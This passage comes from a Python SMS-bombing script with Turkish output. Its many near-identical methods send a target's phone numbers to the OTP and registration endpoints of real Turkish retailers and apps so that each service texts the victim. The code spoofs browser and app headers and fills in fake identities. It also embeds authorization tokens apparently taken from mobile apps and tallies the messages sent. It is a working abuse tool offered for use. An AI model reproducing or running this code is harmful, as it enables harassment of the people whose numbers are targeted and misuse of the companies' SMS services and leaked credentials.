                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue

            
    #loncamarket.com
    def Lonca(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
                    json={"Address": numara, "ConfirmationType": 0}
                    lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
                    if lonca.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    
    #dgnonline.com
    def Dgn(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}
                    dgn = requests.post(url, headers=headers, data=data)
                    if dgn.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #yaanimail.com
    def Yaani(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
                    json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{numara}"}]}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue 
            
             
    #defacto.com.tr
    def Defacto(self):
           
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"mobilePhone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["Data"]["IsSMSSend"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #mopas.com.tr
    def Mopas(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #icq.net
    def Icq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
                    json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{numara}", "route": "sms"}, "reqId": "25299-1669396271"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"]["code"] == 20000:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #boyner.com
    def Boyner(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["Success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #watsons.com.tr
    def Watsons(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
                    json={"countryCode": "TR", "phoneNumber": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #buyursungelsin.com
    def Buyur(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #idealdata.com.tr
    def Osmanlideal(self):


        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #pinarsu.com.tr
    def Pinar(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
                    headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
                    json={"MobilePhone": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.text == "true":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #suiste.com
    def Suiste(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://suiste.com:443/api/auth/code"
                    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
                    data = {"action": "register", "gsm": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["code"] == "common.success":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #hayatsu.com.tr
    def Hayat(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
                    json={"mobilePhoneNumber": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["IsSuccessful"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #pisir.com
    def Pisir(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
                    if r.json()["ok"] == "1":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
                
    
    #KimGbIster
    def KimGb(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #ikinciyeni.com
    def IkinciYeni(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["isSucceed"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #terrapizza.com.tr
    def Terra(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
                    json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
                    r = requests.post(url,  json=json)
                    if (r.status_code) == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

            
            
    #ipragaz.com.tr
    def IpraGaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}
                    r = requests.post(url, json=json)
                    if (r.json()["phoneNumber"]) == str(numara):
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}
                    r = requests.post(url, json=json)
                    if (r.json()["messageCode"]) == "OK":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    #ipragaz.com.tr
    def GoMobile(self):
    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={numara}&isRegistered=true")
                    if (r.json()["data"]["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
